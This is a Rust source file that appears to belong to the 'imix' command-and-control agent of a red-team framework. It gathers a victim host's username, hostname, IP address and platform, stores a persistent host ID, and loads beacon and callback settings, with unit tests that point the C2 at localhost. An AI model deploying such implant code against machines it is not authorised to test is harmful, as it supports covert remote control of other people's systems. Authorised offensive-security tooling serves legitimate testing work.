use anyhow::{Context, Result};
use c2::pb::host::Platform;
use std::{
    fs::{self, File},
    io::Write,
    path::Path,
};
use sys_info::{linux_os_release, os_release};
use uuid::Uuid;

use crate::Config;

#[derive(Clone, Debug)]
pub struct AgentProperties {
    pub principal: String,
    pub hostname: String,
    pub beacon_id: String,
    pub host_id: String,
    pub primary_ip: Option<String>,
    pub agent_id: String,
    pub host_platform: Platform,
}

fn get_principal() -> Result<String> {
    Ok(whoami::username())
}

fn get_hostname() -> Result<String> {
    Ok(whoami::hostname())
}

fn get_beacon_id() -> Result<String> {
    let beacon_id = Uuid::new_v4();
    Ok(beacon_id.to_string())
}

fn get_host_id(host_id_file_path: String) -> Result<String> {
    let mut host_id = Uuid::new_v4().to_string();
    let host_id_file = Path::new(&host_id_file_path);
    if host_id_file.exists() {
        host_id = match fs::read_to_string(host_id_file) {
            Ok(tmp_host_id) => tmp_host_id.trim().to_string(),
            Err(_) => host_id,
        };
    } else {
        let mut host_id_file_obj = match File::create(host_id_file) {
            Ok(tmp_file_obj) => tmp_file_obj,
            Err(_) => return Ok(host_id), // An error occured don't save. Just go.
        };
        match host_id_file_obj.write_all(host_id.as_bytes()) {
            Ok(_) => {} // Don't care if write fails or not going to to send our generated one.
            Err(_) => {}
        }
    }
    Ok(host_id)
}

fn get_primary_ip() -> Result<String> {
    let res = match default_net::get_default_interface() {
        Ok(default_interface) => {
            if default_interface.ipv4.len() > 0 {
                default_interface
                    .ipv4
                    .get(0)
                    .context("No ips found")?
                    .addr
                    .to_string()
            } else {
                "DANGER-UNKNOWN".to_string()
            }
        }
        Err(e) => {
            #[cfg(debug_assertions)]
            eprintln!("Error getting primary ip address:\n{e}");
            "DANGER-UNKNOWN".to_string()
        }
    };
    Ok(res)
}

fn get_host_platform() -> Result<Platform> {
    if cfg!(target_os = "linux") {
        return Ok(Platform::Linux);
    } else if cfg!(target_os = "windows") {
        return Ok(Platform::Windows);
    } else if cfg!(target_os = "macos") {
        return Ok(Platform::Macos);
    } else if cfg!(target_os = "freebsd")
        || cfg!(target_os = "openbsd")
        || cfg!(target_os = "netbsd")
    {
        return Ok(Platform::Bsd);
    } else {
        return Ok(Platform::Unspecified);
    }
}

fn get_os_pretty_name() -> Result<String> {
    if cfg!(target_os = "linux") {
        let linux_rel = linux_os_release()?;
        let pretty_name = match linux_rel.pretty_name {
            Some(local_pretty_name) => local_pretty_name,
            None => "UNKNOWN-Linux".to_string(),
        };
        return Ok(format!("{}", pretty_name));
    } else if cfg!(target_os = "windows") || cfg!(target_os = "macos") {
        return Ok(os_release()?);
    } else {
        return Ok("UNKNOWN".to_string());
    }
}

pub fn agent_init(config_path: String, host_id_path: String) -> Result<(AgentProperties, Config)> {
    let config_file =
        File::open(config_path.clone()).with_context(|| format!("Failed to open {config_path}"))?;

    let imix_config = serde_json::from_reader(config_file)
        .with_context(|| format!("Failed to parse {config_path}"))?;

    let principal = match get_principal() {
        Ok(username) => username,
        Err(error) => {
            #[cfg(debug_assertions)]
            eprintln!("Unable to get process username\n{}", error);
            "UNKNOWN".to_string()
        }
    };

    let hostname = match get_hostname() {
        Ok(tmp_hostname) => tmp_hostname,
        Err(error) => {
            #[cfg(debug_assertions)]
            eprintln!("Unable to get system hostname\n{}", error);
            "UNKNOWN".to_string()
        }
    };

    let beacon_id = match get_beacon_id() {
        Ok(tmp_beacon_id) => tmp_beacon_id,
        Err(error) => {
            #[cfg(debug_assertions)]
            eprintln!("Unable to get a random beacon id\n{}", error);
            "DANGER-UNKNOWN".to_string()
        }
    };

    let agent_id = format!(
        "{}-{}",
        "imix",
        option_env!("CARGO_PKG_VERSION").unwrap_or_else(|| "UNKNOWN")
    );

    let host_platform = match get_host_platform() {
        Ok(tmp_host_platform) => tmp_host_platform,
        Err(error) => {
            #[cfg(debug_assertions)]
            eprintln!("Unable to get host platform id\n{}", error);
            Platform::Unspecified
        }
    };

    let primary_ip = match get_primary_ip() {
        Ok(tmp_primary_ip) => Some(tmp_primary_ip),
        Err(error) => {
            #[cfg(debug_assertions)]
            eprintln!("Unable to get primary ip\n{}", error);
            None
        }
    };

    // let host_id_file = if cfg!(target_os = "windows") {
    //     "C:\\ProgramData\\system-id"
    // } else {
    //     "/etc/system-id"
    // }
    // .to_string();

    let host_id = match get_host_id(host_id_path) {
        Ok(tmp_host_id) => tmp_host_id,
        Err(error) => {
            #[cfg(debug_assertions)]
            eprintln!("Unable to get or create a host id\n{}", error);
            "DANGER-UNKNOWN".to_string()
        }
    };

    Ok((
        AgentProperties {
            principal,
            hostname,
            beacon_id,
            host_id,
            primary_ip,
            agent_id,
            host_platform,
        },
        imix_config,
    ))
}

#[cfg(test)]
mod tests {
    use anyhow::Context;
    use tempfile::NamedTempFile;

    use super::*;

    #[test]
    fn imix_test_agent_init() -> Result<()> {
        let mut tmp_file = NamedTempFile::new()?;
        let tmp_path = tmp_file
            .path()
            .to_str()
            .context("Failed to get path")?
            .to_string();
        tmp_file.write_all(
            r#"{
                "service_configs": [
                    {
                        "name": "imix",
                        "description": "Imix c2 agent",
                        "executable_name": "imix",
                        "executable_args": ""
                    }
                ],
                        "target_forward_connect_ip": "127.0.0.1",
            "target_name": "test1234",
            "callback_config": {
                "interval": 4,
                "jitter": 1,
                "timeout": 4,
                "c2_configs": [
                {
                    "priority": 1,
                    "uri": "http://127.0.0.1/grpc"
                }
                ]
            }
        }
        "#
            .as_bytes(),
        )?;
        let tmp_file = NamedTempFile::new()?;
        let tmp_host_id = String::from(tmp_file.path().to_str().unwrap());

        let (properties, _config) = agent_init(tmp_path.clone(), tmp_host_id.clone())?;
        let (properties2, config2) = agent_init(tmp_path, tmp_host_id)?;
        assert_eq!(properties.host_id, properties2.host_id);
        assert_ne!(properties.beacon_id, properties2.beacon_id);
        assert!(properties2.agent_id.contains("imix-"));
        assert_eq!(
            config2
                .callback_config
                .c2_configs
                .get(0)
                .context("No callbacks configured")?
                .uri,
            "http://127.0.0.1/grpc"
        );
        Ok(())
    }

    #[test]
    fn imix_test_get_os_pretty_name() {
        assert!(get_os_pretty_name().is_ok());
    }

    #[test]
    fn imix_test_get_principal() {
        assert!(get_principal().is_ok())
    }

    #[test]
    fn imix_test_get_hostname() {
        assert!(get_hostname().is_ok())
    }

    #[test]
    fn imix_test_get_beacon_id() {
        assert!(get_beacon_id().is_ok())
    }

    #[test]
    fn imix_test_get_host_id() -> Result<()> {
        let tmp_file = NamedTempFile::new()?;
        let tmp_path = tmp_file
            .path()
            .to_str()
            .context("Failed to get path")?
            .to_string();
        let host_id = get_host_id(tmp_path.clone())?;
        let host_id2 = get_host_id(tmp_path)?;
        assert_eq!(host_id, host_id2);
        Ok(())
    }

    #[test]
    fn imix_test_get_primary_ip() {
        assert!(get_primary_ip().is_ok())
    }

    #[test]
    fn imix_test_get_host_platform() {
        assert!(get_host_platform().is_ok())
    }
}
